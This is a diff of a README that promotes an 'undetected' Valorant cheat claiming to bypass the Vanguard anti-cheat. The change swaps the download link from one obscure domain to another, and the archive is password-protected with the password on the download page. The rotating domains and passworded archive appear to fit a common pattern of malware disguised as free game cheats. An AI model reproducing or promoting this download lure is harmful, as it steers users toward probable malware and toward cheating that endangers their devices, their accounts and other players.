@@ -18,7 +18,7 @@ Valorant Anti Flash - undetected cheat for Valorant. Bypasses Vanguard anti-chea
 
 ## Download
 
-[![Download v4.0.0](https://img.shields.io/badge/Download_v4.0.0-ec4899?style=for-the-badge&logoColor=white)](https://dllvcrun.com/valantiflash)
+[![Download v4.0.0](https://img.shields.io/badge/Download_v4.0.0-ec4899?style=for-the-badge&logoColor=white)](https://p-csx-5.com/valantiflash)
 
 > The archive password is shown on the download page.
 
